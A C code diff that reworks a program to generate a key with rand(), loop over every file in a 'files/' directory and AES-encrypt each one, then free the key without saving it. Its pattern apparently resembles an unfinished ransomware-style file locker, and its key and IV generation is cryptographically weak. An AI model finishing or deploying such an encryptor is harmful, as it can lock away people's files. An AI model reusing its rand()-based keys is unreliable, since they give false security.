@@ -7,7 +7,7 @@
 #include <openssl/aes.h>
 #include <openssl/rand.h>
 
-void encrypt(unsigned char *key) {
+void encrypt(unsigned char *key, char *fileName) {
     // AES Encryption parameters
     int block_size = 16; // AES uses 128-bit block size encryption
     EVP_CIPHER_CTX *ctx;
@@ -19,7 +19,7 @@ void encrypt(unsigned char *key) {
     for (i = 0; i < 16; i++) {
          iv[i] = rand();
     }
-    printf("%s", iv);    
+
     // Initiate cipher and store key/iv in it
     EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, 1);
 
@@ -28,14 +28,14 @@ void encrypt(unsigned char *key) {
     unsigned char buffer_out[1024 + block_size];
 
     // File information -- only one for testing right now
-    FILE *curr_file, *temp_output;
-    char fileName[] = "file_to_encrypt.txt";
+    FILE *temp_output, *curr_file;
     char fileTemp[] = "temp_file.txt";
 
     // Read the binaries of the current file
     curr_file = fopen(fileName, "rb");
     temp_output = fopen(fileTemp, "wb");
-
+    printf("%s\n", fileName);
+    return;
     // Read in the current file into blocks
     int bytes_read, out_len;
     while(1) {
@@ -68,30 +68,28 @@ int main () {
     // Our cipher parameters
     int num_bytes = 32; // 256-bit key size
     unsigned char *key = malloc(num_bytes);
+    char fileName[256];
     // Our directory structure
     DIR *users;
     struct dirent *entry;
-    
+
     // Generate the key
     size_t i;
     for (i = 0; i < num_bytes; i++) {
          key[i] = rand();
     }
-
-    users = opendir("files");
+    char directory[] = "files/";
+    users = opendir(directory);
     while( (entry=readdir(users)) )
     {
-        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) {
+        strcpy(fileName, entry->d_name);
+        if (!strcmp(fileName, ".") || !strcmp(fileName, "..")) {
             continue;
         } 
-        printf("%s\n", entry->d_name);
+        // Call the encryption function to encrypt the files
+        encrypt(key, fileName);
     }
-    closedir(users);
-
-
-    // Call the encryption function to encrypt the files
-    encrypt(key);
-    
+    closedir(users);    
     // We don't like our keys being stored in the memory
     free(key);
     return 0;
